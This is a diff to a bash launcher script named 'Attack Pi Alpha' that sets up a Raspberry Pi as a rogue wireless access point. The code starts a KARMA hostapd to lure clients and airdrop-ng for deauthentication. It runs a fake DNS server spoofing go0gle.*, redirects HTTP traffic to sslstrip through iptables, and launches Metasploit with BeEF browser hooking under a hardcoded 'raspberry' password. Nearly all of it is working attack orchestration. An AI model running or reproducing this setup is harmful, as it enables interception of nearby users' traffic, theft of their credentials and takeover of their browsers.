@@ -1,4 +1,5 @@
 #!/bin/bash
+# MANUALLY SET FOR DEMO MODE VERSION
 echo "=========================="
 echo "WELCOME TO ATTACK PI ALPHA"
 echo "=========================="
@@ -52,11 +53,11 @@ case $mode in
     ;;
 2)
     #freewifi
-    conffile='../conf/freewifi.conf'
+    conffile='conf/freewifi.conf'
     ;;
 3)
     #balls-out attack mode
-    conffile='../hostapd.conf'
+    conffile='conf/hostapd.conf'
     ;;
 *)
     echo "Invalid mode selection."
@@ -69,6 +70,8 @@ esac
 
 #prep the interface for wireless operations.
 killall wicd
+killall NetworkManager
+killall nm-applet
 killall dhclient
 killall wpa_supplicant
 killall wpa_cli
@@ -108,10 +111,24 @@ ifconfig $lan hw ether 02:ab:cd:ef:12:30
 # might be having issues with this....
 ifconfig $lan 10.1.1.1 netmask 255.255.255.0
 
+#Super basic airdrop allow rule creator
+#immunizer.py [mac] [rulefile to write to or append to]
+cp conf/rule.base conf/rule.conf
+bin/airdrop-immunizer.py $lan conf/rule.conf
 
-echo "interface=$lan"|cat - conf/$conffile > /tmp/out && mv /tmp/out /etc/hostapd.conf
+killall airdrop-ng
+#tmux new-window -tAttack:4 -n 'Airdrop' 'bin/airdrop2/airdrop-ng -i $secondlan -r conf/ruleWORKS.conf'
+tmux new-window -tAttack:4 -n 'Airdrop' 'bin/airdrop2/airdrop-ng -i '$secondlan' -r conf/ruleWORKS.conf -c 10;sleep 1'
+
+#bin/airdrop2/airdrop-ng -i $secondlan -r conf/rule.conf &> airdrop_log.log &
+
+secondlanmac=`bin/get_mac.py $secondlan`
+
+#echo ""|cat - conf/$conffile > /tmp/out && mv /tmp/out /etc/hostapd.conf
+echo "Started airdrop"
 
 #KARMA
+echo "interface=$lan"|cat - $conffile > /tmp/out && mv /tmp/out /etc/hostapd.conf
 killall hostapd-karma
 tmux new-window -tAttack:5 -n 'HostAPD' 'bin/hostapd-karma -dd /etc/hostapd.conf'
 echo "Started Karma Hostapd"
@@ -128,16 +145,30 @@ killall fakedns.py
 #I used go0gle.com and give it the ip address assigned to the lan interface
 # This is dynamic because i hope to set these values via a configuration file
 # in the future revisions of this project
-$lanip=`bin/get_ip.py $lan`
+lanip=`bin/get_ip.py $lan`
 # TODO: Configuration file sets beef hook name
-echo "go0gle.* $lanip"|cat - conf/dns.conf > /tmp/out && mv -f conf/dns.current
-cd bin/
-tmux new-window -tAttack:7 -n 'dns' 'fakedns.py ../conf/dns.current'
+echo "go0gle.* $lanip"|cat - conf/dns.conf > /tmp/out && mv -f /tmp/out conf/dns.current
+cd bin
+tmux new-window -tAttack:7 -n 'dns' './fakedns.py ../conf/dns.current'
 cd ../
 
+#setup IPTables -- no firewall, just NAT
+iptables -F
+iptables -X
+iptables --table nat --flush
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A OUTPUT -o lo -j ACCEPT
+iptables -A INPUT -i $lan -j ACCEPT
+iptables -A OUTPUT -o $lan -j ACCEPT
+iptables -A FORWARD -i $internet -o wlan0 -j ACCEPT
+iptables -A FORWARD -i $lan -o $internet -j ACCEPT
+iptables -A POSTROUTING -t nat -o $internet -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination 10.1.1.1:8080
+
 #PROXY
-killall proxy.py
-tmux new-window -tAttack:7 -n 'Proxy' 'bin/proxy/proxpy.py -x bin/proxy/plugins/inject.py'
+killall sslstrip
+tmux new-window -tAttack:8 -n 'Proxy' 'sslstrip -l 8080 -a'
 
 ###########CANT ENABLE RELIABLY WITHOUT A 512MB PI################################
 #MSRPC Service
@@ -145,20 +176,18 @@ killall msfconsole
 # TODO: The MSFRPC password is hardcoded as pi/raspberry.  This probably won't be suitable for advanced ass-hattery
 echo "WARNING: THE MSFRPC PASSWORD IS 'raspberry' YOU HAVE TO CHANGE IT ON YOUR OWN IN THE SCRIPTS"
 # locations bin/msf/scripts/beef/beef.rc, bin/beef/extensions/metasploit/config.yaml
-tmux new-window -tAttack:8 -n 'MSF' 'bin/msf/msfconsole -r bin/msf/scripts/beef/beef.rc'
+tmux new-window -tAttack:9 -n 'MSF' 'bin/msf/msfconsole -r bin/msf/scripts/beef/beef.rc'
 #sleep because we don't want beef to load before metasploit does
-sleep 2m
+sleep 1m
 ########################################################################################
 
 #Beef
 killall beef
 #beef hates being started from anywhere other than it's home folder.
 cd bin/beef
-tmux new-window -tAttack:9 -n 'BEEF' './beef'
+tmux new-window -tAttack:10 -n 'BEEF' './beef'
 cd ../../
 
 #done
 tmux attach -t Attack
-#tmux select-window -tAttack:0
-#byobu
 echo "Services have started -- you may need to wait for beef."
